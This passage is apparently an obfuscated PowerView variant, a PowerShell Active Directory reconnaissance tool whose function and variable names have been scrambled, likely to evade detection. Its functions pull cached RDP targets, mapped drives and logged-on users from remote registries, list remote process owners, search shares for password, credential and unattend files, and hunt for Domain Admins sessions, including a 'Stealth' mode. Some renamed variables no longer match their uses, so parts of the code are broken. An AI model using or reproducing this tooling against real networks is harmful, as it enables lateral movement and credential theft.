                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $GUjPLkDs99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
                $wCCDGuSV99 = New-Object PSObject
                $wCCDGuSV99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                $wCCDGuSV99 | Add-Member Noteproperty 'LastLoggedOn' $GUjPLkDs99
                $wCCDGuSV99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $wCCDGuSV99
            }
            catch {
                Write-Warning "[expedites] Error opening remote registry on $zNIilCKh99. Remote registry likely not enabled."
            }
        }
    }
}
function roomfuls {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $HKU = 2147483651
            $OVaBPDBZ99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $zNIilCKh99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $OVaBPDBZ99['Credential'] = $xjRyyQze99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $GVNsIXsD99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($wHVidHbc99 in $GVNsIXsD99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $QuaUtxHk99 = exaggerations -aBusFQKN99 $wHVidHbc99 -xjRyyQze99 $xjRyyQze99
                        }
                        else {
                            $QuaUtxHk99 = exaggerations -aBusFQKN99 $wHVidHbc99
                        }
                        $HVpfKgXH99 = $Reg.EnumValues($HKU,"$wHVidHbc99\Software\Microsoft\Terminal Server Client\Default").sNames
                        ForEach ($heRBCiuh99 in $HVpfKgXH99) {
                            if ($heRBCiuh99 -match 'MRU.*') {
                                $LUTGpCYF99 = $Reg.GetStringValue($HKU, "$wHVidHbc99\Software\Microsoft\Terminal Server Client\Default", $heRBCiuh99).sValue
                                $hbxHdrkQ99 = New-Object PSObject
                                $hbxHdrkQ99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                                $hbxHdrkQ99 | Add-Member Noteproperty 'UserName' $QuaUtxHk99
                                $hbxHdrkQ99 | Add-Member Noteproperty 'UserSID' $wHVidHbc99
                                $hbxHdrkQ99 | Add-Member Noteproperty 'TargetServer' $LUTGpCYF99
                                $hbxHdrkQ99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $hbxHdrkQ99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $hbxHdrkQ99
                            }
                        }
                        $yFKPSjBp99 = $Reg.EnumKey($HKU,"$wHVidHbc99\Software\Microsoft\Terminal Server Client\Servers").sNames
                        ForEach ($GejzMkbd99 in $yFKPSjBp99) {
                            $hBHgMRpG99 = $Reg.GetStringValue($HKU, "$wHVidHbc99\Software\Microsoft\Terminal Server Client\Servers\$GejzMkbd99", 'UsernameHint').sValue
                            $hbxHdrkQ99 = New-Object PSObject
                            $hbxHdrkQ99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                            $hbxHdrkQ99 | Add-Member Noteproperty 'UserName' $QuaUtxHk99
                            $hbxHdrkQ99 | Add-Member Noteproperty 'UserSID' $wHVidHbc99
                            $hbxHdrkQ99 | Add-Member Noteproperty 'TargetServer' $GejzMkbd99
                            $hbxHdrkQ99 | Add-Member Noteproperty 'UsernameHint' $hBHgMRpG99
                            $hbxHdrkQ99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $hbxHdrkQ99
                        }
                    }
                    catch {
                        Write-Verbose "[roomfuls] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[roomfuls] Error accessing $zNIilCKh99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function Denmark {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            $HKU = 2147483651
            $OVaBPDBZ99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $zNIilCKh99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $OVaBPDBZ99['Credential'] = $xjRyyQze99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $GVNsIXsD99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($wHVidHbc99 in $GVNsIXsD99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $QuaUtxHk99 = exaggerations -aBusFQKN99 $wHVidHbc99 -xjRyyQze99 $xjRyyQze99
                        }
                        else {
                            $QuaUtxHk99 = exaggerations -aBusFQKN99 $wHVidHbc99
                        }
                        $ToNNUoPf99 = ($Reg.EnumKey($HKU, "$wHVidHbc99\Network")).sNames
                        ForEach ($OMWYiJeZ99 in $ToNNUoPf99) {
                            $QDdjbddc99 = $Reg.GetStringValue($HKU, "$wHVidHbc99\Network\$OMWYiJeZ99", 'ProviderName').sValue
                            $uiywjxSn99 = $Reg.GetStringValue($HKU, "$wHVidHbc99\Network\$OMWYiJeZ99", 'RemotePath').sValue
                            $higczhYK99 = $Reg.GetStringValue($HKU, "$wHVidHbc99\Network\$OMWYiJeZ99", 'UserName').sValue
                            if (-not $QuaUtxHk99) { $QuaUtxHk99 = '' }
                            if ($uiywjxSn99 -and ($uiywjxSn99 -ne '')) {
                                $agIJaylj99 = New-Object PSObject
                                $agIJaylj99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                                $agIJaylj99 | Add-Member Noteproperty 'UserName' $QuaUtxHk99
                                $agIJaylj99 | Add-Member Noteproperty 'UserSID' $wHVidHbc99
                                $agIJaylj99 | Add-Member Noteproperty 'DriveLetter' $OMWYiJeZ99
                                $agIJaylj99 | Add-Member Noteproperty 'ProviderName' $QDdjbddc99
                                $agIJaylj99 | Add-Member Noteproperty 'RemotePath' $uiywjxSn99
                                $agIJaylj99 | Add-Member Noteproperty 'DriveUserName' $higczhYK99
                                $agIJaylj99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $agIJaylj99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Denmark] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Denmark] Error accessing $zNIilCKh99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function quadriplegics {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $lgkTdAeF99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($zNIilCKh99 in $lgkTdAeF99) {
            try {
                $OVaBPDBZ99 = @{
                    'ComputerName' = $lgkTdAeF99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $OVaBPDBZ99['Credential'] = $xjRyyQze99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $cqLUEqgz99 = New-Object PSObject
                    $cqLUEqgz99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99
                    $cqLUEqgz99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $cqLUEqgz99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $cqLUEqgz99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $cqLUEqgz99 | Add-Member Noteproperty 'User' $Owner.User
                    $cqLUEqgz99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $cqLUEqgz99
                }
            }
            catch {
                Write-Verbose "[quadriplegics] Error enumerating remote processes on '$zNIilCKh99', access likely denied: $_"
            }
        }
    }
}
function interleukin {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $BUQfxdwb99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $ZQkDJBEr99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $XSflXwFU99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $ekIMPglU99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $VeoiPngD99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $obqWYBKq99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $bkMNXGTo99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $evIihJWj99,
        [Switch]
        $bKvStpka99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $BUQfxdwb99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $VrICpjXS99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $ZQkDJBEr99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $VrICpjXS99['Include'] = @('*.exe')
        }
        $VrICpjXS99['Force'] = -not $PSBoundParameters['ExcludeHidden']
        $StuOJRFu99 = @{}
        function pantheism {
            [CmdletBinding()]Param([String]$Path)
            try {
                $xjUzgpvh99 = [IO.File]::OpenWrite($Path)
                $xjUzgpvh99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($WVpqhVQc99 in $Path) {
            if (($WVpqhVQc99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $tWXZQGKv99 = (New-Object System.Uri($WVpqhVQc99)).Host
                if (-not $StuOJRFu99[$tWXZQGKv99]) {
                    unhooking -lgkTdAeF99 $tWXZQGKv99 -xjRyyQze99 $xjRyyQze99
                    $StuOJRFu99[$tWXZQGKv99] = $True
                }
            }
            $VrICpjXS99['Path'] = $WVpqhVQc99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $nBMHTicS99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $nBMHTicS99 = $False
                }
                if ($ZQkDJBEr99 -and ($_.LastAccessTime -lt $ZQkDJBEr99)) {
                    $nBMHTicS99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $XSflXwFU99)) {
                    $nBMHTicS99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $ekIMPglU99)) {
                    $nBMHTicS99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (pantheism -Path $_.FullName))) {
                    $nBMHTicS99 = $False
                }
                if ($nBMHTicS99) {
                    $KRKuCyEr99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $omkBLeio99 = New-Object -TypeName PSObject -Property $KRKuCyEr99
                    $omkBLeio99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $omkBLeio99
                }
            }
        }
    }
    END {
        $StuOJRFu99.Keys | shoeing
    }
}
function debase {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $lgkTdAeF99,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $bcFYSNuu99,
        [Parameter(Position = 2)]
        [Hashtable]
        $HqqhpecG99,
        [Int]
        [ValidateRange(1,  100)]
        $LNieHbVi99 = 20,
        [Switch]
        $IDtFjRIf99
    )
    BEGIN {
        $KTyPdlpk99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $KTyPdlpk99.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not $IDtFjRIf99) {
            $cfuyURWd99 = Get-Variable -Scope 2
            $SuFvBXiV99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
            ForEach ($Var in $cfuyURWd99) {
                if ($SuFvBXiV99 -NotContains $Var.Name) {
                $KTyPdlpk99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($RCrwyHAj99 in (Get-ChildItem Function:)) {
                $KTyPdlpk99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $RCrwyHAj99.Name, $RCrwyHAj99.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $LNieHbVi99, $KTyPdlpk99, $Host)
        $Pool.Open()
        $yCCcshgi99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $khGcZXac99 = $M.GetParameters()
            if (($khGcZXac99.Count -eq 2) -and $khGcZXac99[0].Name -eq 'input' -and $khGcZXac99[1].Name -eq 'output') {
                $yCCcshgi99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $lgkTdAeF99 = $lgkTdAeF99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[debase] Total number of hosts: $($lgkTdAeF99.count)"
        if ($LNieHbVi99 -ge $lgkTdAeF99.Length) {
            $LNieHbVi99 = $lgkTdAeF99.Length
        }
        $DdkiglJX99 = [Int]($lgkTdAeF99.Length/$LNieHbVi99)
        $RjcBWLcP99 = @()
        $Start = 0
        $End = $DdkiglJX99
        for($i = 1; $i -le $LNieHbVi99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $LNieHbVi99) {
                $End = $lgkTdAeF99.Length
            }
            $List.AddRange($lgkTdAeF99[$Start..($End-1)])
            $Start += $DdkiglJX99
            $End += $DdkiglJX99
            $RjcBWLcP99 += @(,@($List.ToArray()))
        }
        Write-Verbose "[debase] Total number of threads/partitions: $LNieHbVi99"
        ForEach ($FKoiZLIt99 in $RjcBWLcP99) {
            $iPhUzoxE99 = [PowerShell]::Create()
            $iPhUzoxE99.runspacepool = $Pool
            $Null = $iPhUzoxE99.AddScript($bcFYSNuu99).AddParameter('ComputerName', $FKoiZLIt99)
            if ($HqqhpecG99) {
                ForEach ($Param in $HqqhpecG99.GetEnumerator()) {
                    $Null = $iPhUzoxE99.AddParameter($Param.Name, $Param.Value)
                }
            }
            $jmVDoyyB99 = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $iPhUzoxE99
                Output = $jmVDoyyB99
                Result = $yCCcshgi99.Invoke($iPhUzoxE99, @($Null, [Management.Automation.PSDataCollection[Object]]$jmVDoyyB99))
            }
        }
    }
    END {
        Write-Verbose "[debase] Threads executing"
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        $UgtPAbEm99 = 100
        Write-Verbose "[debase] Waiting $UgtPAbEm99 seconds for final cleanup..."
        for ($i=0; $i -lt $UgtPAbEm99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose "[debase] all threads completed"
    }
}
function labyrinths {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $lgkTdAeF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cIQhKeSL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $DadXoedG99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jPqTmeSS99,
        [Alias('Unconstrained')]
        [Switch]
        $PCjjFzqw99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $PhGukTEa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $HNBlKzGX99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $GZGGRJzb99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PndMyEmp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qgzVOkSs99,
        [ValidateNotNullOrEmpty()]
        [String]
        $TYbeeSHd99,
        [ValidateNotNullOrEmpty()]
        [String]
        $MKwNKJfU99,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $WwQIimAb99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $ZcyVoWad99,
        [Alias('AllowDelegation')]
        [Switch]
        $PiSihEEM99,
        [Switch]
        $xWWRvjWJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $ebFmufYv99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $tlkgnzQk99 = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $UcLCSjsJ99,
        [Switch]
        $MRlFgLNB99,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $lJrIZavr99 = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $LNieHbVi99 = 20
    )
    BEGIN {
        $rsKAQUCp99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $rsKAQUCp99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['ComputerDomain']) { $rsKAQUCp99['Domain'] = $cIQhKeSL99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $rsKAQUCp99['LDAPFilter'] = $DadXoedG99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $rsKAQUCp99['SearchBase'] = $jPqTmeSS99 }
        if ($PSBoundParameters['Unconstrained']) { $rsKAQUCp99['Unconstrained'] = $tdRSmHCF99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $rsKAQUCp99['OperatingSystem'] = $fNLjzEnS99 }
        if ($PSBoundParameters['ComputerServicePack']) { $rsKAQUCp99['ServicePack'] = $OUZDyVMQ99 }
        if ($PSBoundParameters['ComputerSiteName']) { $rsKAQUCp99['SiteName'] = $ixDINSpI99 }
        if ($PSBoundParameters['Server']) { $rsKAQUCp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $rsKAQUCp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $rsKAQUCp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $rsKAQUCp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $rsKAQUCp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $rsKAQUCp99['Credential'] = $xjRyyQze99 }
        $UYMYjrtp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UYMYjrtp99['Identity'] = $PndMyEmp99 }
        if ($PSBoundParameters['Domain']) { $UYMYjrtp99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['UserDomain']) { $UYMYjrtp99['Domain'] = $qgzVOkSs99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $UYMYjrtp99['LDAPFilter'] = $TYbeeSHd99 }
        if ($PSBoundParameters['UserSearchBase']) { $UYMYjrtp99['SearchBase'] = $MKwNKJfU99 }
        if ($PSBoundParameters['UserAdminCount']) { $UYMYjrtp99['AdminCount'] = $ZcyVoWad99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $UYMYjrtp99['AllowDelegation'] = $PiSihEEM99 }
        if ($PSBoundParameters['Server']) { $UYMYjrtp99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $UYMYjrtp99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $UYMYjrtp99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $UYMYjrtp99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $UYMYjrtp99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $UYMYjrtp99['Credential'] = $xjRyyQze99 }
        $QDUcaCgD99 = @()
        if ($PSBoundParameters['ComputerName']) {
            $QDUcaCgD99 = @($lgkTdAeF99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[labyrinths] Stealth enumeration using source: $lJrIZavr99"
                $KHxdRVan99 = New-Object System.Collections.ArrayList
                if ($lJrIZavr99 -match 'File|All') {
                    Write-Verbose '[labyrinths] Querying for file servers'
                    $bRyuYVDf99 = @{}
                    if ($PSBoundParameters['Domain']) { $bRyuYVDf99['Domain'] = $gddrYpaX99 }
                    if ($PSBoundParameters['ComputerDomain']) { $bRyuYVDf99['Domain'] = $cIQhKeSL99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $bRyuYVDf99['SearchBase'] = $jPqTmeSS99 }
                    if ($PSBoundParameters['Server']) { $bRyuYVDf99['Server'] = $GejzMkbd99 }
                    if ($PSBoundParameters['SearchScope']) { $bRyuYVDf99['SearchScope'] = $yuycROvu99 }
                    if ($PSBoundParameters['ResultPageSize']) { $bRyuYVDf99['ResultPageSize'] = $vUSyLBJJ99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $bRyuYVDf99['ServerTimeLimit'] = $cNGaYdSy99 }
                    if ($PSBoundParameters['Tombstone']) { $bRyuYVDf99['Tombstone'] = $kQTByXSX99 }
                    if ($PSBoundParameters['Credential']) { $bRyuYVDf99['Credential'] = $xjRyyQze99 }
                    $EPBxeOpy99 = outperform @FileServerSearcherArguments
                    if ($EPBxeOpy99 -isnot [System.Array]) { $EPBxeOpy99 = @($EPBxeOpy99) }
                    $KHxdRVan99.AddRange( $EPBxeOpy99 )
                }
                if ($lJrIZavr99 -match 'DFS|All') {
                    Write-Verbose '[labyrinths] Querying for DFS servers'
                }
                if ($lJrIZavr99 -match 'DC|All') {
                    Write-Verbose '[labyrinths] Querying for domain controllers'
                    $BfFSnkzU99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $BfFSnkzU99['Domain'] = $gddrYpaX99 }
                    if ($PSBoundParameters['ComputerDomain']) { $BfFSnkzU99['Domain'] = $cIQhKeSL99 }
                    if ($PSBoundParameters['Server']) { $BfFSnkzU99['Server'] = $GejzMkbd99 }
                    if ($PSBoundParameters['Credential']) { $BfFSnkzU99['Credential'] = $xjRyyQze99 }
                    $PTXUIVwK99 = numbed @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($PTXUIVwK99 -isnot [System.Array]) { $PTXUIVwK99 = @($PTXUIVwK99) }
                    $KHxdRVan99.AddRange( $PTXUIVwK99 )
                }
                $QDUcaCgD99 = $KHxdRVan99.ToArray()
            }
            else {
                Write-Verbose '[labyrinths] Querying for all computers in the domain'
                $QDUcaCgD99 = pickerels @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[labyrinths] TargetComputers length: $($QDUcaCgD99.Length)"
        if ($QDUcaCgD99.Length -eq 0) {
            throw '[labyrinths] No hosts found to enumerate'
        }
        if ($PSBoundParameters['Credential']) {
            $YhJEgkCE99 = $xjRyyQze99.GetNetworkCredential().UserName
        }
        else {
            $YhJEgkCE99 = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters['ShowAll']) {
            $nImnTSFZ99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $nImnTSFZ99 = wasteland @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $Xycmjcai99 = @{
                'Identity' = $WwQIimAb99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $Xycmjcai99['Domain'] = $qgzVOkSs99 }
            if ($PSBoundParameters['UserSearchBase']) { $Xycmjcai99['SearchBase'] = $MKwNKJfU99 }
            if ($PSBoundParameters['Server']) { $Xycmjcai99['Server'] = $GejzMkbd99 }
            if ($PSBoundParameters['SearchScope']) { $Xycmjcai99['SearchScope'] = $yuycROvu99 }
            if ($PSBoundParameters['ResultPageSize']) { $Xycmjcai99['ResultPageSize'] = $vUSyLBJJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $Xycmjcai99['ServerTimeLimit'] = $cNGaYdSy99 }
            if ($PSBoundParameters['Tombstone']) { $Xycmjcai99['Tombstone'] = $kQTByXSX99 }
            if ($PSBoundParameters['Credential']) { $Xycmjcai99['Credential'] = $xjRyyQze99 }
            $nImnTSFZ99 = Twitter @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[labyrinths] TargetUsers length: $($nImnTSFZ99.Length)"
        if ((-not $UcLCSjsJ99) -and ($nImnTSFZ99.Length -eq 0)) {
            throw '[labyrinths] No users found to target'
        }
        $bxgZLetd99 = {
            Param($lgkTdAeF99, $nImnTSFZ99, $YhJEgkCE99, $MRlFgLNB99, $hChekWvA99)
            if ($hChekWvA99) {
                $Null = properest -hChekWvA99 $hChekWvA99 -Quiet
            }
            ForEach ($LzaREudW99 in $lgkTdAeF99) {
                $Up = Test-Connection -Count 1 -Quiet -lgkTdAeF99 $LzaREudW99
                if ($Up) {
                    $dqioMStw99 = immaculately -lgkTdAeF99 $LzaREudW99
                    ForEach ($LSgYBfLL99 in $dqioMStw99) {
                        $QuaUtxHk99 = $LSgYBfLL99.UserName
                        $CName = $LSgYBfLL99.CName
                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }
                        if (($QuaUtxHk99) -and ($QuaUtxHk99.Trim() -ne '') -and ($QuaUtxHk99 -notmatch $YhJEgkCE99) -and ($QuaUtxHk99 -notmatch '\$$')) {
                            if ( (-not $nImnTSFZ99) -or ($nImnTSFZ99 -contains $QuaUtxHk99)) {
                                $BBoeZNOp99 = New-Object PSObject
                                $BBoeZNOp99 | Add-Member Noteproperty 'UserDomain' $Null
                                $BBoeZNOp99 | Add-Member Noteproperty 'UserName' $QuaUtxHk99
